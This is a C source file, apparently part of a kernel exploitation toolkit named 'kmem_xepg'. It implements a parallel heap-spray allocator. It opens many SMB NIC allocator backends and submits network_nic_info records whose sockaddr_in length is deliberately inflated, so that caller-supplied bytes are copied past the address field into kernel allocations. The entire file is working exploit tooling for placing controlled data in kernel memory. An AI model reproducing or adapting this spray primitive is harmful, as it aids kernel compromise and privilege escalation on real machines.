//
//  allocator_nic_parallel.c
//  kmem_xepg
//
//  Created by admin on 12/21/21.
//

#include <assert.h>
#include <stdlib.h>

#include "../smb/nic_allocator.h"

#include "allocator_nic_parallel.h"
#include "util_dispatch.h"
#include "util_misc.h"

#define MAX_SADDR_ALLOCS_PER_NIC 32
#define MAX_NICS_PER_SMB_DEV 32

struct kmem_allocator_nic_parallel {
    smb_nic_allocator* backends;
    size_t backend_count;
};

kmem_allocator_nic_parallel_t kmem_allocator_nic_parallel_create(const struct sockaddr_in* smb_addr, size_t allocs) {
    int num_allocs_per_smb = MAX_NICS_PER_SMB_DEV * MAX_SADDR_ALLOCS_PER_NIC;
    int num_backends = (int)(allocs / num_allocs_per_smb);
    smb_nic_allocator* backends = malloc(sizeof(smb_nic_allocator) * num_backends);
    
    size_t infos_size = sizeof(struct network_nic_info) * MAX_NICS_PER_SMB_DEV;
    struct network_nic_info* infos = malloc(infos_size);
    bzero(infos, infos_size);
    for (int nic_index = 0; nic_index < MAX_NICS_PER_SMB_DEV; nic_index++) {
        struct network_nic_info* info = &infos[nic_index];
        info->nic_index = nic_index;
        info->addr_4.sin_len = sizeof(info->addr_4);
        info->addr_4.sin_family = AF_INET;
        info->addr_4.sin_addr.s_addr = UINT32_MAX;
        info->next_offset = sizeof(*info);
    }
    
    int error = xe_util_dispatch_apply(backends, sizeof(backends[0]), num_backends, NULL, ^(void* ctx, void* data, size_t index) {
        smb_nic_allocator* allocator = (smb_nic_allocator*)data;
        *allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
        return smb_nic_allocator_allocate(*allocator, infos, MAX_NICS_PER_SMB_DEV, sizeof(struct network_nic_info) * MAX_NICS_PER_SMB_DEV);
    });
    assert(error == 0);
    free(infos);
    
    kmem_allocator_nic_parallel_t allocator = malloc(sizeof(struct kmem_allocator_nic_parallel));
    allocator->backends = backends;
    allocator->backend_count = num_backends;
    return allocator;
}

void kmem_allocator_nic_parallel_alloc(kmem_allocator_nic_parallel_t allocator, char* data, size_t data_size) {
    int allocs_per_backend = MAX_SADDR_ALLOCS_PER_NIC * MAX_NICS_PER_SMB_DEV;
    size_t infos_size = sizeof(struct network_nic_info) * allocs_per_backend;
    struct network_nic_info* infos = malloc(infos_size);
    bzero(infos, infos_size);
    assert(data_size < (sizeof(infos->addr_strg) - sizeof(infos->addr_4.sin_family) - sizeof(infos->addr_4.sin_len)));
    
    for (int nic_index = 0; nic_index < MAX_NICS_PER_SMB_DEV; nic_index++) {
        for (int saddr_index = 0; saddr_index < MAX_SADDR_ALLOCS_PER_NIC; saddr_index++) {
            struct network_nic_info* info = &infos[nic_index * MAX_SADDR_ALLOCS_PER_NIC + saddr_index];
            info->nic_index = nic_index;
            info->addr_4.sin_len = data_size + offsetof(struct sockaddr_in, sin_addr) + sizeof(info->addr_4.sin_addr);
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_addr.s_addr = nic_index * allocs_per_backend + saddr_index;
            memcpy(((char*)&info->addr_4.sin_addr) + sizeof(info->addr_4.sin_addr), data, data_size);
            info->next_offset = sizeof(*info);
        }
    }
    
    int error = xe_util_dispatch_apply(allocator->backends, sizeof(allocator->backends[0]), allocator->backend_count, NULL, ^(void* ctx, void* data, size_t index) {
        return smb_nic_allocator_allocate(*((smb_nic_allocator*)data), infos, allocs_per_backend, (uint32_t)infos_size);
    });
    assert(error == 0);
}

void kmem_allocator_nic_parallel_destroy(kmem_allocator_nic_parallel_t* allocator_p) {
    kmem_allocator_nic_parallel_t allocator = *allocator_p;
    int error = xe_util_dispatch_apply(allocator->backends, sizeof(allocator->backends[0]), allocator->backend_count, NULL, ^(void* ctx, void* data, size_t index) {
        return smb_nic_allocator_destroy((smb_nic_allocator*)data);
    });
    assert(error == 0);
    free(allocator->backends);
    free(allocator);
    *allocator_p = NULL;
}
